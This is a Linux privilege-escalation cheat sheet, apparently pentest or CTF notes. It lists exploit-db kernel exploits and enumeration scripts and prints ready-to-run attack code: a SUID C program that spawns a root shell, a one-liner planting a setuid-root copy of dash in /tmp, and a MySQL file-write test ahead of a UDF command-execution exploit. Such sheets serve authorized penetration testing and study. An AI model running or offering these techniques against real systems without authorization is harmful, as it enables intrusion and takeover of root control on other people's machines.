# Privilege Escalation

---

- [Resources](#resources)
- [Enumeration](#enumeration)
- [Services](#services)

<a name="resources"></a>
## Resources

- [GTFOBins](https://gtfobins.github.io/) - (List of unix binaries that if run by sudo can give root rce)
- [DirtyCow](https://dirtycow.ninja/) - https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs 
- [Full Nelson](https://www.exploit-db.com/exploits/15704)
- [DCCP](https://www.exploit-db.com/exploits/41458)

<a name="enumeration"></a>
## Automated Enumeration
- [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
- [linpeas.sh](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
- [lse.sh](https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh) - Linux smart enumeartion
- [linux-exploit-suggestor](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh) - Runs on the victim.
- perl [linux-exploit-suggester-2.pl](https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl) -k 2.6.32 - Check for kernel version exploits on the attacker/
- [unix-privesc-check](https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh) standard > output.txt - Generate the privesc check with standard mode.
- `post/multi/recon/local_exploit_suggester` - Metasploit module suggests exploits the box might be vulnerable to escalation.
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
- [BeRoot](https://github.com/AlessandroZ/BeRoot)

<a name="suid"></a>
Set UID C Program
```c
int main() {setresuid(0,0,0);system("/bin/bash -i");}
```

Root Dash. Note: Dash does not reset SUID like later versions of bash.
May need to pass the -i or -p flag when running the copied dash.
```sh
cp /bin/dash /tmp/root; chown root:root /tmp/root; chmod 6777 /tmp/root; /tmp/root -p;
```

<a name="services"></a>
## Services
Display processes running as root
```sh
ps aux | grep "^root"
```

Enumerate Versions
```sh
<program> --version
```

```sh
<program> -v
```

```sh
dpkg -l | grep <program>
```

```sh
rpm -qa | grep <program>
```

<a name="mysql"></a>
## MySQL

If MySQL is running as root, and we have access to write files, we can write a MySQL library which contains a function to execute OS commands.
- [User Defined Functions (UDF)](https://www.exploit-db.com/exploits/46249)

Write a file to test we can write a file and if it is owned by root.
```sql
SELECT 'test' INTO OUTFILE '/tmp/test.txt';
```
